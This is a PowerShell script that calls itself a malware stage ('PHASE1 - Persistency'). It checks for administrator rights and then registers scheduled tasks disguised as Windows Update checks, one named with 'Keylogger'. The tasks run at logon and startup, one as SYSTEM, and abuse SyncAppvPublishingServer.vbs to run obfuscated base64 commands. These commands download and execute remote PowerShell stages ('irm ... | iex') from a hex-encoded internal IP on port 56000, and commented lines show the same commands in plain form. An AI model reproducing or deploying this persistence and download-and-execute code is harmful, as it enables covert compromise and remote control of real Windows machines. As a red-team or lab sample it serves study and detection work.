if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
    
    $msg = "`n`n## PHASE1 - Persistency`n`tOh, you have been infected`n`nCreating and Running  Scheduled Tasks for Persistence`n`nI am operating as $(whoami)"

    $msg | Out-File -FilePath C:\Users\Public\MalwareOutput.txt -Append



    $syncappVBS1 = '%SystemDrive%\Windows\System32\SyncAppvPublishingServer.vbs'
    # $syncappVBS_args1 = 'n; irm http://10.10.10.10:56000/phase2.ps1 | iex' 
    $syncappVBS_args1 = "n; iex([SysTEm.tEXT.encodinG]::uTF8.geTsTRIng([SysteM.convert]::frOmbASE64strINg('JHZ0OTNEYnVPQUZNSGh5U2RveUpUdjVGN01IemFBM0lPUTBLWVV6MFlZRWJIeUtReUtqdEdZa0w2R1VCN1p6dno3RFBodHJxd2xrUnBJM3NlNktDTUhDRDhpY01XRUxJaVJ0ZEVoY3EzeU5qNWhkUFdhN1Z2Vlg0aCA9ICRmQWxTZQokeUxodFRDbnppZWlrY0NUUjBFVVNVZk04aVB3SFdiY1Zialp6QWRVRlEwUnhsb0FaVEFBZkM2RTdKdVJCSFRjS1VCcWsyNnUycFF6V0UxT0xiaVFMTnNOdXp2YlZvRk5rQkhhWWppZ1lyeWVicjJyVjJWODJTTXpOcDNnQWpJOHhjUHo0YTZVd3BiQVFGUjQ5ZWJIN3BEY0VDbzVUNVg5SER0MzRNMFJwNnRVbzFNV012emxrYUc1SktLS0h4Mm94NTRlWVJLVzIwcVJ3NnM1eW1Zb004WXg4SVlHSkZiUnhxSDl0TXdMcDBMVUtiMklHcmdIWHlkN2N1R1YxaXBiZ2prRXVMa3FSR3BJOEFFNVdsQ2liWmM2UFgyVWNLcUlsdnFFTVlNZWNjNTByNWdHbGY2UldSSHBDV1JGUnB6a0czUlVDalBaVk9yZFVya2tKYjBxVEVuMU1USWhlNnFxaWlhTHF1SWE3Y1VUdTYwdnNrandiRHFkZXB5VjRaYzlzUzg5dlRYUWRmU2F6c1FOOWxSY1l1NjRJRVF5Tmh1bGxmaGZQNU5uS3F3TFZSRTJNVngzREZRb2RCU003MEtoME5qSlJPM1J1akZqSnlwdVROVXFWTm1mbzNIdVhmcjZlVlF1RmQwMEpuUUtNNENtbTZvSXBDbmp2dTByOVdraWtGWXhOQ0hzcnQxWlJlMUtRZmVWaXQyTDRqUkRvWkcxMzNBT3hjNDZKa0R3emZoTml0c09IRWd2VXBZdVlXZXo4QkFvQmJaeGpaeDNVb2NoSXRXdFdxUE45bzhTQlVhajRFd1BZWDVXeVFveXJCUmZvMDdkNnM4bHpobU1jTEp5ZWN6NlNkbGxNVnBkS0x1R1JyaUxod1RJZ0FHSFpWUmlPeDRzaUUyYjRYRXgzMk1nbHB4WlVMdWtFcXNNWVlEaEVXS0dlNU1uZ0JldVdlemNyNzRJMWQwT2NacUJ1OVNUUFBpYm9wTjQ4UEhnVHAzclRPcGdvcXp1VkRtdWxpdTV0TmdUWjVlNzBzMHhvVFJiZ2kgPSAkVHJVZQokMUNsVGlQZDNVZ2FTVTY0MWtZaGc1YU5OemVXWTExQjZoaDJ6cXZHblNBVXUxWk1ha1JYMjdPdFpKTk84TlRIdnFCNVpIazgzQ01HU1FIZE1BcnNrMnFOdmd2cEpWeUVYMzNqWmdEcXBtTDJpQTZoM3Z3YWJCWFZlR1JRZmk5WU5aMkllODFoaWdEeHAzR05pbkRxa2J4M1g4akdXUlVOa0RtWTk4dTBueDkwdVRFOFN3S1pkMGYxQVhEdG11RjV3ZGJIY2FRWXlPZzlkd1BMYjRKeVhLNnBoNW9rYURmcE9YdW4wWXJWdU92QjRydEFnQTlaUkhtSnBXRXA0bzRQYk40NmxrRkowbzhBUnJMZGQzQ1BOSzhlUHQ1anJJMWpldTZaNG8zaEhuTnZ6eVRUTktXcGxFeTBFRmNyM0FWUFNYdmhRbVZPZHVlcUk2MjJCMkJNZ2g5Y3VSUmpNS3I3b3hFV2xDWkpUaElQVm81eFQwNndrdjBxdkhpa0tBRmg1VUp5OTg1RjkwUjFpa25mS2lhcFI0bEhyY0NIUkhBMG1XdEZENlVRaVhVYWlWQzJUQ1QycFdIVWs3RGNpSVNtVHZEUERpOTBWS1Y3Nk1TTk16Vm85VDdqV01RMEpNTFF3SVRQbUIwOFVLRVhtcExxeTYxRms0ZGRWY1hjWWQ2elZLUXRBREtIM2hhRTlyb2h0Z0dlWjRabXNPcUM1eWhOd3doYUozb1l3ZFppcDJVRlhKNWtyR1RPcFhuNGJuSElwUGdUbEhlWEJRUUtITlllSm5mcFVKU1N6d0VRN3I3UHBlRGFjRlZ2VVVVajd4blBaYmxRNXZQMmtSUkZIdmROUDhrZWozTGpHUE92ID0gJE51TGwKaXJtIGh0dHA6Ly8weGEwYTBhMGE6NTYwMDAvcGhhc2UyLnBzMSB8IGlleA==')));exit" 

    $syncappVBS2 = '%SystemDrive%\Windows\System32\SyncAppvPublishingServer.vbs'
    # $syncappVBS_args2 = 'n; irm http://10.10.10.10:56000/phase3_updates.ps1 | iex' 
    $syncappVBS_args2 = "n; iex([SYSteM.Text.eNCOdiNG]::UtF8.GetSTRIng([sysTem.coNVert]::FRoMBAsE64sTRinG('JEtSQ3F0ZkJEY3R2S0cwODZ5YjNvYmxHZFNJYkNyb3RWTHFrRXl5b25KUmNwbFVBS3lXWEpvNXVrbzJVYWprUXNQeHVHZlZzS0h0dTJrcmp6NEprSnBNV09wUlUxNkRXcXJ5YXQ4R1o4d2R1bnBxYVdDVnVsOUhvdGZkdWlsSEg4dXRwM1lLRXpwQ0xzTllYZ1ZDMGpwVEI1aXJNbE9ObUthb2xCUDZseG4xQUFOcXlpWDVjY3JWUm1ObW03UEdxcFl3TDhBUEVWeUtCc2N5UkJvUnVtUnl6RDJJQm5YZXB1ZUNydVRCVW1LSVNwMHpjYXpzaTZPOWlhM01WYThmU3F2OGttWERFc0Fpd2Vha2JTWmZySTZhTWlkYjQwZUJsTDI4ZHdEVWFJT1dTbkt0WkJBcU1wWEhKazJnbmhKclhBTU94MXZNV05zSXhrNUpJTENlQlF2OWJ1U2ZRRkpjRWpvWEJSeWF0akZJSE5IbFQxQnNYOEcxbHBWZ0tnc0xTcWR4Nlo5ZVlEUjVFRXpmYTRaSW8xID0gJEZhbFNFCiRDZEpUdUE1aXdqWndyVjY5a1RVcVNRWTFzS1ZwVTdnMlVRS2xVaGlRTkhHMktKRmNuNkFtWkJLRzdmcFp3NWtXVG41TTg5cU9RMUJlelp6aHg1eVpYNEd1dUlxenNpN1YycDRBRGliUUlZbXNEQ1RYZXBmT083clVlMGJxUk1kRzdMZzZDamNiWXRQU09EeGNyVFk2MDQ5TUJzVzRISldUY1dpSTdycWxDT3NhTXVPWFJhSm1iWkRNd09BanVWNFl4dEJPalNLa0ozZXUxZVVqQmNucTNBczhiaFg3S0ZaVWJYbDlIem1hSlM2UkJ6Q0tLMHNlZGFkckZuMGhwMzdJVnIzNldySXRkUWRqakp2TGE2RDRhT2pqaVZ2TUlBNDVMYkVLcENGejVTNzgybWZhOXh1eld2S1NoUHN6ZTZ4MkY5V1NYRjc0amFHckhtdHRVV1NWVmliVjA4NmFzSkZ3OFd0b0FGUU5EV3FSVEdBd3c0ejZxZGJoY1E3Q3RIUDNjM1pyMjBsNnZDa3R3ZmN4S0M2NVZDSUk2WWtHeE1lcko2V1pLdFFla0oyWmVDeXJqWHpHem5zUDlGbUtJdEZqTkVKM2xUWVdzZHRlOTBnalp4Y2pkbFUycDV2TlluVTBUUlNSYUU0RHU4RWxPUU9HWVFxQ2VyM0ZkTGdsQUowTDY5MDhtTUdNMW9NRXlFUXFvazZGd1BPZVRhbmlodXJtV09mQzlJeXFqMkRuaFg3azdBdElxQlZWczFVcklCTk1rMUZOYmE1TGpmSmtmc00yNk02bzFURkc3Q2JhYTBoSjlpRWYzN1hYV2hlQ1VlbzE0YzF6N1M5TjFRYlNIVjZkd3FQaXFJazBjYTFINW5pN2l2R0kxZVJkS0puS1pWbVRnTnVlS2VvT2xQUzRBbHdqd2hxM1dqVzlLT1B5SGY4cXJrTHpuQnNpVlI3QmNHM1pKYTJEZVUyeFphbnRjVVZDZ1prSVJ0eWJmZVBHY2hnZE15R0NZenNLQU1tb2tWMDNuTmx1YXVEU3BSWEdkekhoMnNJRVVMSTB4cThOSEJ3UHBLdU83djZXRjh5VjZUQWtxbXhhVEZ4NUltaEhpZVFTMThZRWFOUjZLSnl3VmxUMVdWVWNsZE5zQ0MxMVA3eVRZdUpoVzR5OTBibWdBd3ZoZ2lvWU13T2l2V1pHeXUgPSAkVFJ1ZQokamp4eGgyMG5vQWIyT25zdlJSczZqUkpBRWlqQ0VkT29ScGp0THZCQWhGcW9LdUd0RjhtSzh1aHBlTUkwR3BmNXBONWRxSEw5WkpEYlI0RkJOQXR4emxXWGhHNTBnaGJHMzY5ekdUQjVScTZaS3N6c3ZsbnRicnBQdHpMcWdRc291WmR0MWlIWlh4Z3NOcGQwcWlBYjY1dE1KMDB3ZERmY1BCRTRuNGFIemtGcmFIcGFCSzFzc2J4YjhaeVgyYXVRRmZzN3dOMW1ldkJVbEFkRnJJejk0SlRNZTFhWDc2NllYMm91d01nNERnMzV5Qm1UZVp4M0dMSHhZN2NEbUp2WCA9ICRudWxMCmlybSBodHRwOi8vMHhhMGEwYTBhOjU2MDAwL3BoYXNlM191cGRhdGVzLnBzMSB8IGlleA==')));exit" 


    $action1 = New-ScheduledTaskAction -Execute $syncappVBS1 -Argument $syncappVBS_args1
    $action2 = New-ScheduledTaskAction -Execute $syncappVBS2 -Argument $syncappVBS_args2

    $trigger_startup = New-ScheduledTaskTrigger -AtStartup
    $trigger_logon = New-ScheduledTaskTrigger -AtLogon
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries


    # $task1 = New-ScheduledTask -Action $action1 -Trigger $trigger -Settings $settings
    # $task2 = New-ScheduledTask -Action $action2 -Trigger $trigger -Settings $settings
    $random_id = [guid]::NewGuid().ToString()
    $task_name1 = "Keylogger System Updates Critical Check " + $random_id
    $task_name2 = "Updates System Updates Critical Check " + $random_id

    $task_path = "\Microsoft\Windows\WindowsUpdate\"
    $taks_desc = "Updates system critical check to ensure system security | ID:" + $random_id
    $task_usr_System = "NT AUTHORITY\SYSTEM"
    $task_usr = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName

    # $task_usr_curr_logged = "NT AUTHORITY\INTERACTIVE"

    try{
        # Error
        #Register-ScheduledTask -TaskName $task_name1 -InputObject $task1 -TaskPath $task_path -Description $taks_desc -User $task_usr -RunLevel Highest
        #Register-ScheduledTask -TaskName $task_name2 -InputObject $task2 -TaskPath $task_path -Description $taks_desc -User $task_usr -RunLevel Highest
        
        #Phase2
        Register-ScheduledTask -Action $action1 -Trigger $trigger_logon -Settings $settings -TaskName $task_name1 -TaskPath $task_path -Description $taks_desc -User $task_usr -RunLevel Highest -Force

        #Updates
        Register-ScheduledTask -Action $action2 -Trigger $trigger_startup -Settings $settings -TaskName $task_name2 -TaskPath $task_path -Description $taks_desc -User $task_usr_System -RunLevel Highest -Force

        Start-ScheduledTask -TaskPath $task_path -TaskName $task_name1
        Start-ScheduledTask -TaskPath $task_path -TaskName $task_name2
        $msg = "## PHASE1 - DONE`n`tScheduled Tasks Created`n`n"
        $msg | Out-File -FilePath C:\Users\Public\MalwareOutput.txt -Append
    } catch {
        $msg = "## PHASE 1 - Smutny Pribeh`n`tCannot create Scheduled tasks`n`nERROR:`n`n$($_.Exception.Message)"
        $msg | Out-File -FilePath C:\Users\Public\MalwareOutput.txt -Append
    }

} else {
   $msg = "## PHASE 1 - Smutny Pribeh`n`tNot an Admin`n`nYou are $(whoami)"
   $msg | Out-File -FilePath C:\Users\Public\MalwareOutput.txt -Append
}